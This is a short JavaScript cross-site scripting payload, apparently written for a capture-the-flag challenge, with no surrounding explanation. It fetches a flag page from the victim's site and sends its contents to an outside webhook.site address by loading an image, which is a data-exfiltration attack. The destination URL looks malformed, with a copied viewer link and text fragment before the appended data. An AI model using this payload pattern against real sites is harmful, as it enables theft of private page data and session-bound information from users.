fetch('/xss-two-flag')
  .then(r => r.text())
  .then(flag => {
    new Image().src = 'https://webhook.site/#!/view/df3cbd5e-ca31-4457-b8ff-ac4735fe041c/526cac77-ede9-4cbb-89d6-620a59532708/1:~:text=https%3A//webhook.site/df3cbd5e%2Dca31%2D4457%2Db8ff%2Dac4735fe041c' + encodeURIComponent(flag);
  });
